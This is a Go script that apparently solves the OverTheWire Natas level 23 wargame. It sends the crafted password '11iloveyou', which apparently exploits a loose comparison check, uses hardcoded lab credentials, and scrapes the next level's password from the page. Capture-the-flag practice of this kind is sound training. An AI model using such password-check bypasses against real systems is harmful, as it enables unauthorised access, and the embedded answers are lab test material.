package main

import "fmt"
import "io/ioutil"
import "net/http"
import "net/url"
import "strings"

func getFlag() string {

	var result string = ""

	params := url.Values{}
	params.Set("passwd", "11iloveyou")
	base_url := "http://natas23.natas.labs.overthewire.org/"
	real_url := base_url + "?" + params.Encode()

	client := &http.Client{}

	request, _ := http.NewRequest("GET", real_url, nil)
	request.Header.Add("Content-Type", "text/html")
	request.SetBasicAuth("natas23", "qjA8cOoKFTzJhtV0Fzvt92fgvxVnVRBj")

	response, err1 := client.Do(request)

	if err1 == nil {

		body, err2 := ioutil.ReadAll(response.Body)

		if err2 == nil {

			html := string(body)

			if strings.Contains(html, "<pre>") && strings.Contains(html, "Password:") && strings.Contains(html, "</pre>") {

				tmp1 := html[strings.Index(html, "<pre>"):]
				tmp2 := tmp1[strings.Index(tmp1, "Password:")+9:]
				result = strings.TrimSpace(tmp2[0:strings.Index(tmp2, "</pre>")])

			}

		}

	}

	return result

}

func main() {

	flag := getFlag()

	fmt.Println(flag)

}

